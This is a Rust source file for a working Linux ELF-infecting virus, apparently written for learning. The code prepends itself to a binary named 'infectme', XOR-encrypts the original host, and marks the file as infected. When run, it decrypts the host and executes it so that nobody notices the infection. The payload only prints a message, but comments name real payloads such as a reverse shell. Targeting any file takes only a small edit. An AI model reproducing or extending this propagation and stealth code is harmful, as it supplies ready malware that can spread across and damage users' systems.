use std::error::Error;
use std::ffi::{OsStr, OsString};
use std::fs::File;
use std::io::prelude::Seek;
use std::io::{Read, SeekFrom, Write};

use std::os::unix::fs::OpenOptionsExt;
use std::process::Command;
use std::{env, fs};

// ELF header
const ELF_MAGIC: [u8; 4] = [0x7f, 0x45, 0x4c, 0x46];

// locate this array within binary to see if it's infected
const INFECTION_MARK: [u8; 5] = [0x22, 0x33, 0x44, 0x55, 0x66];

// We need to know the size in order to determine where our virus code ends and original binary code begins
const VIRUS_SIZE: u64 = 3_349_864;

// Will use to encrypt/decrypt host binary using XOR '^' operation
const XOR_KEY: [u8; 8] = [0x12, 0x22, 0x32, 0x42, 0xAA, 0xAB, 0xAC, 0xF2];


fn is_elf(path: &OsStr) -> Result<bool, Box<dyn Error>> {
    let mut magic = [0; 4];

    // Read exactly four bytes from start of file
    File::open(path)?.read_exact(&mut magic)?;

    // Do the four bytes match what we expect from a typical ELF binary (i.e., does the magic string match?)
    Ok(magic == ELF_MAGIC)
}

fn xor_enc_dec(input: Vec<u8>) -> Vec<u8> {
    // Loop through all bytes in file buffer and perform XOR (exclusive-OR) operation on each byte
    // Modulus '%' allows us to wrap the computed index within XOR_KEY range, so we never go out of bounds
    // since modulus arithmetric says computed index must be between 0 and XOR_KEY.len() - 1
    // a % b = c where c has possible answer range (0 through b-1)

    // If file buffer is encrypted with our XOR_KEY, this will decrypt.  Otherwise it will encrypt.

    input
        .iter()
        .enumerate()
        .map(|(index, element)| element ^ XOR_KEY[index % XOR_KEY.len()])
        .collect()
}

fn payload() {
    println!("I'm infected!  I like turtles.");
    println!("Thankfully I do nothing malicious!");
}

fn is_infected(path: &OsStr) -> Result<bool, Box<dyn Error>> {
    let file_size = fs::metadata(&path)?.len() as usize;
    let buf = fs::read(path)?;

    // Iterate through entire binary, looking for location of first element of INFECTION_MARK array
    for x in 1..file_size {

        // We found a match for the first infection element
        if buf[x] == INFECTION_MARK[0] {

            // Y is used for offset from x, so we can make sure each subsequent byte matches INFECTION_MARK array element
            for y in 1..INFECTION_MARK.len() {

                // offset larger than binary size?  we're not infected, so let's bounce.
                if (x + y) >= file_size {
                    break;
                }

                // byte at offset Y doesn't match what we're expecting?  Let's bounce.
                if buf[x + y] != INFECTION_MARK[y] {
                    break;
                }

                // we've made it all the way to the last offset and are still here.  Must be infected!
                if y == INFECTION_MARK.len() - 1 {
                    return Ok(true);
                }
            }
        }
    }

    Ok(false)
}

fn infect(virus: &OsString, target: &OsStr) -> Result<(), Box<dyn Error>> {

    // Read file we want to infect
    let host_buf = fs::read(target)?;

    // Create enough space in our buffer to hold our own code (all of this compiled code)
    let mut virus_buf = vec![0; VIRUS_SIZE as usize];

    // Let's read ourselves (virus code) into a buffer, so that we can write it to a new file
    File::open(virus)?.read_exact(&mut virus_buf)?;

    // Create a new infected file, which will contain virus code + original binary code
    let mut infected = File::create(target)?;

    // Write virus code to file first
    infected.write_all(&virus_buf)?;

    // XOR-encrypt contents of binary we're infecting
    let encrypted_host_buf = xor_enc_dec(host_buf);

    // Write encrypted binary code after virus
    infected.write_all(&encrypted_host_buf)?;

    Ok(())
}

fn run_infected_host(path: &OsString) -> Result<(), Box<dyn Error>> {
    let mut host_buf: Vec<u8> = Vec::new();
    let mut infected = File::open(path)?;
    let tmp_host_path = "/tmp/host";

    {
        // Create a new file under /tmp/host
        let mut plain_host_exe = fs::OpenOptions::new()
            .create(true)
            .write(true)
            .mode(0o755)
            .open(tmp_host_path)?;

        // We're infected at this point (this code is running in infected binary
        // Let's read ourselves, starting at the end of the VIRUS_SIZE
        // This effectively strips out the virus code
        infected.seek(SeekFrom::Start(VIRUS_SIZE))?;
        infected.read_to_end(&mut host_buf)?;

        // Store decrypted, original binary code
        println!("[*] Decrypting original binary code and writing to {}", tmp_host_path);
        let decrypted_host_buf = xor_enc_dec(host_buf);

        // Write out only the original code to this new file at /tmp/host
        // This will be the decrypted, original ELF binary code
        plain_host_exe.write_all(&decrypted_host_buf)?;

        println!("[*] I've stripped out the virus code successfully!")
    }

    println!("[*] Executing original code now (before infection)!");

    // Run the original host code
    Command::new(tmp_host_path).status()?;

    println!("\n[*] Cleaning myself up from {} like a good boy.", tmp_host_path);

    // Clean ourselves up!
    fs::remove_file(tmp_host_path)?;

    Ok(())
}


fn main() -> Result<(), Box<dyn Error>> {

    // Get filename of binary that's being executed (could be virus, could be infected file)
    let myself = OsString::from(env::args().nth(0).unwrap());

    println!("Binary size: {}", fs::metadata(&myself)?.len());

    // Get current directory
    let current_dir = env::current_dir()?;

    // Normally we'd loop through every file and infect if possible, but I'm just checking for a single file.
    // This code will execute in any infected file, so infected files infect other files!
    for entry in fs::read_dir(current_dir)? {
        let path = entry?.path();

        if fs::metadata(&path)?.is_file() {
            let entry_name = path.file_name().unwrap();

            // Make sure the filename is exactly 'infectme'
            if entry_name == OsString::from("infectme") {

                // Make sure it's an elf binary
                if is_elf(entry_name)? {

                    // Make sure it isn't already infected
                    if !is_infected(entry_name)? {
                        println!("[*] Will attempt to infect: {}", entry_name.to_str().unwrap());
                        infect(&myself, entry_name)?;
                        println!("[+] Infection complete!");
                    } else {
                        println!(
                            "[X] Not infecting {} since it appears to already be infected.",
                            entry_name.to_str().unwrap()
                        );
                    }
                }
            }
        }
    }

    // Here we check to see effectively if we're executing as the virus or as an infected file
    // If total file size is greater than the virus size, we can assume we're running in an infected file
    if fs::metadata(&myself)?.len() > VIRUS_SIZE {
        println!("[*] Running virus payload below");

        // Let's run whatever payload we want (e.g., phone home, open reverse shell, etc.)
        payload();

        // Run original binary code, so nobody is none the wiser.
        run_infected_host(&myself)?;
    }

    Ok(())
}
